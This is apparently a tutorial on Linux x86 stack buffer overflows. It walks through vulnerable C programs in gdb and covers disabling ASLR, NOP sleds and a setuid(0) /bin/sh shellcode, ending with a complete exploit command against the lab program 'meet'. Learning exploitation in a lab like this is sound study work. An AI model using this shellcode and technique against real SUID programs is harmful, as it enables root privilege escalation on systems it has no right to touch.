# Linux x86 exploits

Buffer overflows can happen when an application uses an unbounded copy operation (such as `strcpy` in C) to copy a variable-size buffer into a fixed-size buffer without verifying that the fixed-sized buffer is large enough.

## overflow.c

```text
// overflow.c
#include <string.h>
int main(){
    char str1[10];
    //declare a 10 byte string
    //copy 35 bytes of "A" to str1
    strcpy (str1, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    return 0;
}
```

Compile using `-m32` and `-fno-stack-protector` to disable Stack Canary protection:

```text
$ gcc -m32 -fno-stack-protector -o overflow overflow.c
$ ./overflow
zsh: segmentation fault ./overflow
```

Segmentation fault. Start up `gdb`:

```text
$ gdb -q overflow
```

```text
(gdb) r
Starting program: overflow
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

The program crashes when trying to execute the instruction at `0x41414141` (hex for `AAAA`). Check whether the EIP was corrupted with `A`’s:

```text
(gdb) info reg eip
eip     0x41414141      0x41414141
```

When the function (`main` in this case) attempts to return, the saved EIP value is popped off the stack and executed next. Because the address `0x41414141` is out of the process segment, a segmentation fault occurs.

## meet.c

```text
// meet.c
#include <stdio.h>
#include <string.h>

void greeting(char *temp1,char *temp2) {
    char name[400];
    // string variable to hold the name
    strcpy(name, temp2);
    // copy the function argument to name
    printf("Hello %s %s\n", temp1, name); // print out the greeting
}

int main(int argc, char * argv[]) {
    greeting(argv[1], argv[2]); //call function, pass title & name
    printf("Bye %s %s\n", argv[1], argv[2]); // say "bye"
    return 0; //exit program
}
```

Compile and execute:

```text
$ gcc -m32 -g -mpreferred-stack-boundary=2 -fno-stack-protector \
-z execstack -o meet meet.c
$ ./meet Mr `python -c 'print("A"*10)'`
Hello Mr AAAAAAAAAA
Bye Mr AAAAAAAAAA
```

Feed `600` `A`’s to the `meet.c` program as the second parameter:

```text
$ ./meet Mr `python -c 'print("A"*600)'`
zsh: segmentation fault (core dumped) ./meet Mr `python -c 'print("A"*600)'`
```

The `400-byte` buffer has overflowed; To verify that so has the EIP, start `gdb` again:

```text
$ gdb -q ./meet
Reading symbols from ./meet...
```

```text
(gdb) run Mr `python -c 'print("A"*600)'`
Starting program: meet Mr `python -c 'print("A"*600)'`

Program received signal SIGSEGV, Segmentation fault.
0xf7e6e37f in ?? () from /lib32/libc.so.6
```

Check EIP register:

```text
(gdb) info reg eip
eip     0xf7e6e37f      0xf7e6e37f
```

Mved far, far away to another portion of memory. Get the source listing:

```text
(gdb) list
```text
1   // meet.c
2   #include <stdio.h>
3   #include <string.h>
4   void greeting(char *temp1,char *temp2) {
5       char name[400];         // string variable to hold the name
6       strcpy(name, temp2);    // copy the function argument to name
7    printf("Hello %s %s\n", temp1, name); // print out the greeting
8   }
9   int main(int argc, char * argv[]) {
10    greeting(argv[1], argv[2]); //call function, pass title & name
```

Set breakpoint at line 7:

```text
(gdb) b 7
Breakpoint 1 at 0x11d0: file meet.c, line 7.
```

Run:

```text
(gdb) run Mr `python -c 'print("A"*600)'`
Starting program: /home/kali/GHHv6/ch10/meet Mr `python -c 'print("A"*600)'`
Breakpoint 1, greeting (temp1=0x41414141 <error: Cannot access memory at address
0x41414141>, temp2=0x41414141 <error: Cannot access memory at address 0x41414141
at meet.c:7
7   printf("Hello %s %s\n", temp1, name); // print out the greeting
```

The arguments to the function, `temp1` and `temp2`, have been corrupted. Pick a lower number of `A`'s, for example `405`, and then slowly increase it.

Remove breakpoint:

```text
(gdb) d 1
```

```text
(gdb) run Mr `python -c 'print("A"*405)'`
```

```text
(gdb) info reg ebp eip
```

## Summary

What can happen:

* It is really easy to get a segmentation fault when dealing with process memory. 
* The EIP can be controlled to execute malicious code at the user level of access. This happens when the vulnerable program is running at the user level of privilege.
* The EIP can be controlled to execute malicious code at the system or root level. Some Linux functionalities should be protected and reserved for the root user. It is common practice to use Set-user Identification (SUID) and Set-group identification (SGID) to temporarily elevate a process to allow some files to be executed under their owner’s and/or group’s privilege level. But when the SUID/SGID program is vulnerable, a successful exploitation would drop the privileges of the file owner or group (root).

## Local buffer overflow exploits

```text
#include <stdio.h>
#include <sys/mman.h>

const char shellcode[] =  //setuid(0) & Aleph1's famous shellcode, see ref.
"\x31\xc0\x31\xdb\xb0\x17\xcd\x80"      //setuid(0) first
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";

int main() { //main function

    //The shellcode is on the .data segment,
    //we will use mprotect to make the page executable.
    mprotect(
        (void *)((int)shellcode & ~4095),
        4096,
        PROT_READ | PROT_WRITE | PROT_EXEC
    );

    //Convert the address of the shellcode variable to a function pointer,
    //allowing us to call it and execute the code.
    int (*ret)() = (int(*)())shellcode;
    return ret();
}
```

## ASLR

Address space layout randomization (ASLR) works by randomizing the locations of different sections of the program in memory, including the executable base, stack, heap, and libraries, making it difficult for an attacker to reliably jump to a specific memory address. To disable ***ASLR***:

    $ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

## NOP sled

The NOP (no operation) command simply means to do nothing but move to the next command. Hackers have learnt to use NOP for padding. When placed at the front of an exploit buffer, this padding is called a NOP sled. If the EIP is pointed to a NOP sled, the processor will ride the sled right into the next component. On x86 systems, the `0x90` opcode is the most commonly used NOP. Any operation sequence that does not interfere with the exploit’s outcome would be considered equivalent to a NOP.

## Shellcode

Shellcode is a string of binary opcodes for the exploited architecture (Intel x86 32 bit, Intel x86 64 bit, etc), often represented in hexadecimal form. There are tons of shellcode libraries online, for all platforms.

Using `printf` and `wc` to calculate size of a shellcode:

```text
$ printf "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" | wc -c
53
```

## Find address

To find where to point EIP in order to execute the shellcode:

```text
$ gdb -q --args ./meet Mr `python -c 'print("A"*412)'`
```

```text
(gdb) run
Starting program: /path/to/meet Mr AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
...
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

To look at what is on the stack, use the gdb [examine memory](https://sourceware.org/gdb/onlinedocs/gdb/Memory.html) command (for example in batches of 32 words (4 bytes) at a time):

```text
(gdb) x/32z $esp-200
```

Pick an address from the middle of the NOP sled to overwrite EIP.

Final exploit  code:

For `meet.c`, 412 bytes - 53 bytes of shellcode - 4 bytes return address (reversed due to the little-endian style of
`x86` processors) = 355 bytes

```text
$ ./meet Mr `python -c "print('\x90'*355 + '\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + '\x24\xd2\xff\xff')"
```

## Exploit development process

In the real world, vulnerabilities are not always as straightforward as the `meet.c` example. The stack overflow exploit development process generally follows these steps:

1. Control the execution flow (EIP register) by identifying a vulnerability that results in an overflow of a return address.
2. Determine the offset(s) and constrains (bad characters breaking the exploit such as line feeds, carriage returns, and null bytes).
3. Determine the attack vector.
4. Debug and trace the program's flow during the overflow.
5. Build the exploit.
6. Test the exploit.